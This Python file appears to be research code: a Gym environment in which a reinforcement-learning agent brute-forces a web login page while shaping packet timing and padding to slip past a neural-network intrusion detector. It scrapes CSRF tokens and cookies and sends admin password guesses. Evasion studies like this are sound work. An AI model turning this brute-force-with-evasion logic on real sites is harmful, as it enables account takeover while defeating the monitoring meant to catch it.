import gym, socket, pickle, os, random, string
import numpy as np
import os.path as osp

from gym import spaces
from threading import Thread
from pcap_proc import read_iface,  calculate_features
from time import time, sleep
from train_dnn import create_model as dnn_model

class DeEnv(gym.Env):

    metadata = {'render.modes': ['human']}

    def __init__(self, iface, src_port, server, url, attack, obs_len, flow_std_file='data/flows/stats.pkl', model_dir='models', model_type='dnn'):

        super(DeEnv, self).__init__()

        # server params

        self.obs_len = obs_len
        self.n_obs_features = 12
        self.n_actions = 4
        self.port = src_port
        self.remote = server
        self.pkt_list = []
        self.monitor_thr = Thread(target=read_iface, args=(self.pkt_list, iface, src_port, server[0]), daemon=True)
        self.monitor_thr.start()
        self.t_start = time()

        # target model params

        with open(flow_std_file, 'rb') as f:
            stats = pickle.load(f)
        self.target_features = np.where(stats[4] > 0)[0][:-1] # the last feature is the label, we do not need it here
        self.xmin = stats[1]
        self.xmax = stats[2]
        self.target_model = self._load_model(model_dir, model_type)
        self.url = url
        self.attack = attack
        self.label = 0
        self.label_period = 0.0
        #self.label_thr = Thread(target=self._classify, daemon=True)
        #self.label_thr.start()

        # action params

        self.max_delay = 1.0
        self.max_pad = 65535
        self.max_recv_buff = 65535

        # actions: break, delay, pad, packet

        self.action_space = spaces.Box(low=-1, high=1, shape=(self.n_actions,))

        # observation features: time, frame length, header size, window, 8 tcp flags

        self.observation_space = spaces.Box(low=0, high=np.inf, shape=(self.obs_len, self.n_obs_features))

        # other stuff

        self.debug = False
        self.step_count = 0

    def step(self, action):

        t_start = time()

        # actions

        action_std = (np.clip(action, self.action_space.low, self.action_space.high) - self.action_space.low) / (self.action_space.high - self.action_space.low)
        #action_std = np.clip(np.exp(action), 0, 1)
        send_pkt_prob = action_std[0]
        send_pkt_delay = action_std[1] * self.max_delay
        send_pkt_pad = int(action_std[2] * self.max_pad)
        recv_buff = int(action_std[3] * self.max_recv_buff)

        if self.attack == 'bruteforce':
            pkt = self._generate_bruteforce_packet(send_pkt_pad)

        to_be_done = False
        pkts_now = len(self.pkt_list)
        if np.random.rand() < send_pkt_prob:
            pkts_req = pkts_now + 2
            t_now = time()
            if send_pkt_delay > t_now - self.last_step_time:
                sleep(np.maximum(0, send_pkt_delay - t_now + self.last_step_time))
            self.sckt.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, recv_buff)
            try:
                t_start_send = time()
                self.sckt.sendall(pkt.encode('utf-8'))
                t_sent = time() - t_start_send
                if self.debug:
                    print('PACKET SENT:')
                    print(pkt)
                t_rpl_start = time()
                ack = self._process_reply()
                t_rpl_proc = time() - t_rpl_start
                if self.debug:
                    print('Time to send: {0}, time to process: {1}'.format(t_sent, t_rpl_proc))
            except Exception as e:
                pkts_req = None
                ack = False
                to_be_done = True
        else:
            pkts_req = None
            ack = False

        # obtain an observation

        obs = self._get_obs(pkts_req)
        self.last_step_time = time()

        # test against target model

        self._classify(count_max=1)

        # calculate reward

        reward = self._calculate_reward(pkt, ack)
        self.step_count += 1
        step_count = self.step_count
        t_elapsed = time() - t_start

        # done

        y = self.label
        if to_be_done:
            done = True
        elif y == 1:
            done = True
        else:
            done = False
        if done:
            self.sckt.close()
            self.reset()

        if self.debug:
            print(action, y, reward, done)

        return obs, reward, done, {'r': reward, 'l': step_count, 't': t_elapsed}

    def reset(self):
        self.pkt_list.clear()
        self.label = 0.0
        self.step_count = 0
        self._generate_user_agent()
        self._generate_referer()
        self.user_token = None
        self.cookie = None
        self.t_start = time()
        self.sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sckt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sckt.bind(('', self.port))
        ready = False
        while not ready:
            try:
                self.sckt.connect(self.remote)
                ready = True
            except Exception as e:
                pass
        obs = self._get_obs(3)
        self.last_step_time = time()
        return obs

    def render(self, mode='human', close=False):
        pass

    def _get_obs(self, pkts_needed=None, wait_time=5.0):
        t_start = time()
        if pkts_needed is not None:
            while len(self.pkt_list) < pkts_needed and time() - t_start < wait_time:
                sleep(0.001)
        obs = np.zeros((self.obs_len, self.n_obs_features))
        pkt_list = self.pkt_list[-self.obs_len:]
        for i,p in enumerate(pkt_list):
            obs[i, 0] = p[0] - self.t_start
            obs[i, 1] = p[6]
            obs[i, 2] = p[7]
            obs[i, 3] = p[9]
            obs[i, 4] = str(p[8]).count('0')
            obs[i, 5] = str(p[8]).count('1')
            obs[i, 6] = str(p[8]).count('2')
            obs[i, 7] = str(p[8]).count('3')
            obs[i, 8] = str(p[8]).count('4')
            obs[i, 9] = str(p[8]).count('5')
            obs[i, 10] = str(p[8]).count('6')
            obs[i, 11] = str(p[8]).count('7')
        return obs

    def _generate_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            #'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            #'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            #'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            #'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            #'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            #'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            #'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            #'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            #'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            #'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            #'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        self.user_agent = np.random.choice(user_agents)

    def _generate_referer(self):
        referers = [
            'http://www.google.com/?q=',
            #'http://www.usatoday.com/search/results?q=',
            #'http://engadget.search.aol.com/search?q='
        ]
        self.referer = np.random.choice(referers)

    def _generate_bruteforce_packet(self, n_pad):
        if self.cookie == None or self.user_token == None:
            packet_as_a_list = [
                'GET {0} HTTP/1.1'.format(self.url),
                'Host: {0}'.format(self.remote[0]),
                'User-Agent: {0}'.format(self.user_agent),
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                #'Accept-Encoding: gzip, deflate',
                'Referer: {0}{1}\r\n\r\n'.format(self.referer, string.ascii_letters + string.digits, k=n_pad)
            ]
        else:
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=np.random.randint(32,48)))
            pad = ''.join(random.choices(string.ascii_letters + string.digits, k=n_pad))
            content = 'username=admin&password={0}&Login=Login&user_token={1}{2}'.format(password, self.user_token, pad)
            packet_as_a_list = [
                'POST {0} HTTP/1.1'.format(self.url),
                'Host: {0}'.format(self.remote[0]),
                'User-Agent: {0}'.format(self.user_agent),
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                #'Accept-Encoding: gzip, deflate',
                'Referer: {0}'.format(self.referer),
                'Cookie: {0}'.format(self.cookie),
                'Content-Length: {0}\r\n\r\n{1}'.format(len(content), content)
            ]
        return '\r\n'.join(packet_as_a_list)

    def _process_reply(self):
        try:
            reply = self.sckt.recv(4096).decode('utf-8')
            if self.debug:
                print('PACKET RECEIVED:')
                print(reply)
            ack = True
            lines = reply.split('\r\n')
            if self.user_token is None:
                for line in lines:
                    if 'user_token' in line:
                        spl = line.split('value=')
                        self.user_token = spl[1].split('/>')[0][1:-2]
                        break
            if self.cookie is None:
                cookie_list = []
                spl = reply.split('Set-Cookie: ')
                for item in spl[1:]:
                    cookie_value = item.split(';')[0]
                    if cookie_value not in cookie_list:
                        cookie_list.append(cookie_value)
                self.cookie = ';'.join(cookie_list)
        except Exception as e:
            print(e)
            ack = False
        return ack

    def _calculate_reward(self, pkt, ack):
        reward = 0.
        if self.attack == 'bruteforce':
            if 'POST' in pkt and ack == True:
                reward = 1.
        return reward

    def _load_model(self, model_dir, prefix):
        model_score = 0
        model_name = ''
        ckpt_path = ''
        for sd in os.listdir(model_dir):
            subdir = osp.join(model_dir, sd)
            if osp.isdir(subdir) and sd.startswith(prefix):
                try:
                    with open(osp.join(subdir, 'metrics.txt'), 'r') as f:
                        line = f.readline()
                        spl = line.split(',')
                        score = float(spl[-1])
                        if score > model_score:
                            model_score = score
                            model_name = sd
                            ckpt_path = osp.join(subdir, 'ckpt')
                            print(model_name, model_score, ckpt_path)
                except Exception as e:
                    print(e)
        if model_name.startswith('dnn'):
            params = [int(item) for item in model_name.split('_')[1:]]
            model = dnn_model(len(self.target_features), *params)
            model.summary()
            model.load_weights(ckpt_path)
        return model

    def _classify(self, count_max=None):
        count = 0
        while True:
            sleep(self.label_period)
            flow_ids = ['-{0}-{1}-{2}-6'.format(self.port, self.remote[0], self.remote[1])]
            pkt_lists = [[[pkt[0], pkt[6], pkt[7], pkt[9]] for pkt in self.pkt_list]]
            if len(pkt_lists[0]) > 0:
                pkt_flags = [[str(pkt[8]) for pkt in self.pkt_list]]
                pkt_directions = [[1 if pkt[2] == self.port else -1 for pkt in self.pkt_list]]
                v = np.array(calculate_features(flow_ids, pkt_lists, pkt_flags, pkt_directions))
                if len(v.shape) == 2:
                    x = (np.array(v[:, self.target_features]) - self.xmin[self.target_features]) / (self.xmax[self.target_features] - self.xmin[self.target_features])
                    p = self.target_model.predict(x)[0]
                    self.label = np.argmax(p)
                    if self.debug:
                        print('Flow label: {0} ({1}) at {2}'.format(self.label, p, time()))
            count += 1
            if count_max is not None and count >= count_max:
                break